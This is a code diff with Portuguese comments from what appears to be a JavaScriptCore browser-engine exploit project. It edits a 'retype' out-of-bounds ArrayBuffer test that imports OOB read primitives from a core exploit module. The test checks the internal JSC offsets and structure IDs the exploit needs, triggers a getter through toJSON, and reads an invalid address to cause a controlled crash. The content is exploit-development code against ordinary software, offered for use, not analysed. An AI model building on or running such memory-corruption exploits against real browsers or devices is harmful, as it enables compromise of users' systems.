@@ -8,21 +8,19 @@ import {
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Irá ler o config.mjs corrigido
 
 const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
 let retype_getter_called_flag = false;
 let retype_leak_attempt_results = {};
 
-// Endereço baixo e inválido para o teste de crash controlado.
-// Usar 0x0 pode às vezes ser mapeado (página nula), 0x1 é geralmente uma boa aposta para causar um page fault.
 const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);
 
 
 class CheckpointObjectForRetype {
     constructor(id) {
         this.id = `RetypeCheckpoint-${id}`;
-        this.marker = 0xD0D0D0D0; // Marcador interno para identificação
+        this.marker = 0xD0D0D0D0;
     }
 }
 
@@ -33,7 +31,7 @@ export function toJSON_TriggerRetypeCheckpointGetter() {
         for (const prop in this) {
             if (prop === GETTER_CHECKPOINT_PROPERTY_NAME) {
                  logS3(`Propriedade getter "${prop}" encontrada durante 'for...in' em toJSON.`, "info", FNAME_toJSON);
-                 const _ = this[prop];
+                 const _ = this[prop]; // Aciona o getter
             }
         }
     } catch (e) {
@@ -52,30 +50,31 @@ export async function executeRetypeOOB_AB_Test() {
     retype_leak_attempt_results = { success: false, message: "Não inicializado", error: null };
 
     // Validações de configuração (essenciais)
-    // Verifique se JSC_OFFSETS.ArrayBuffer e JSC_OFFSETS.ArrayBuffer.KnownStructureIDs existem antes de acessar ArrayBuffer_STRUCTURE_ID
     if (!JSC_OFFSETS.ArrayBufferContents ||
         JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START === undefined ||
         JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START === undefined ||
-        JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET === undefined ||
-        !JSC_OFFSETS.ArrayBuffer || // <-- ADICIONADO PARA VERIFICAÇÃO
-        !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs || // <-- ADICIONADO PARA VERIFICAÇÃO
-        JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === undefined) { // Linha ~70 onde o erro ocorreu
+        !JSC_OFFSETS.JSCell || JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET === undefined || // Verificação adicionada para JSCell
+        !JSC_OFFSETS.ArrayBuffer ||
+        !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs ||
+        JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === undefined) {
         logS3("Offsets críticos (ArrayBufferContents, JSCell.STRUCTURE_POINTER_OFFSET, ou ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) não estão definidos corretamente em config.mjs. Abortando teste.", "critical", FNAME_TEST);
-        console.error("Detalhes dos Offsets Ausentes/Incorretos:", {
-            hasArrayBufferContents: !!JSC_OFFSETS.ArrayBufferContents,
-            hasDataPointerOffset: JSC_OFFSETS.ArrayBufferContents?.DATA_POINTER_OFFSET_FROM_CONTENTS_START !== undefined,
-            hasSizeInBytesOffset: JSC_OFFSETS.ArrayBufferContents?.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START !== undefined,
-            hasStructurePointerOffset: JSC_OFFSETS.JSCell?.STRUCTURE_POINTER_OFFSET !== undefined,
-            hasArrayBuffer: !!JSC_OFFSETS.ArrayBuffer,
-            hasKnownStructureIDs: !!JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs,
-            hasArrayBufferStructureID: JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID !== undefined
+        // Log mais detalhado para ajudar a identificar o problema exato
+        console.error("Detalhes dos Offsets Ausentes/Incorretos em config.mjs:", {
+            configProvided: !!JSC_OFFSETS,
+            hasJSCell: !!JSC_OFFSETS?.JSCell,
+            hasStructurePointerOffset: JSC_OFFSETS?.JSCell?.STRUCTURE_POINTER_OFFSET !== undefined,
+            hasArrayBufferContents: !!JSC_OFFSETS?.ArrayBufferContents,
+            hasDataPointerOffsetAC: JSC_OFFSETS?.ArrayBufferContents?.DATA_POINTER_OFFSET_FROM_CONTENTS_START !== undefined,
+            hasSizeInBytesOffsetAC: JSC_OFFSETS?.ArrayBufferContents?.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START !== undefined,
+            hasArrayBuffer: !!JSC_OFFSETS?.ArrayBuffer,
+            hasKnownStructureIDsInAB: !!JSC_OFFSETS?.ArrayBuffer?.KnownStructureIDs,
+            hasArrayBufferStructureIDInAB: JSC_OFFSETS?.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID !== undefined
         });
         return;
     }
     const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
-    // A verificação de arrayBufferStructureID !== 2 pode ser mantida ou ajustada conforme sua validação
-    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) {
-         logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o valor comum (2). Verifique config.mjs.`, "warn", FNAME_TEST);
+    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) { // Este valor (2) é o que você validou [cite: 1]
+         logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o valor comum (2) ou o valor validado. Verifique config.mjs.`, "warn", FNAME_TEST);
     }
 
 
